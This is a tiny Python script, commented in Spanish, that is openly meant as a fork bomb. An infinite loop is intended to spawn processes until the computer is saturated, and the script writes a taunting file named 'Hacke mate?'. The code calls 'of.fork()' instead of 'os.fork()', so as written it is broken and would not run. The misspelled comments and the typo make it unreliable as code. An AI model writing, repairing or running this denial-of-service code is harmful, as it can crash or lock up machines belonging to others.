import os

while True: #buclle infinito para cear procesos constantemente.
    of.fork() #funcion que crea un proceso, esto se repitira infinitamente asta saturar la pc.
    file = open("Hacke mate?", "w")
    file.write("la bomba fork no finalizo por motivos desconocidos")
    file.close()
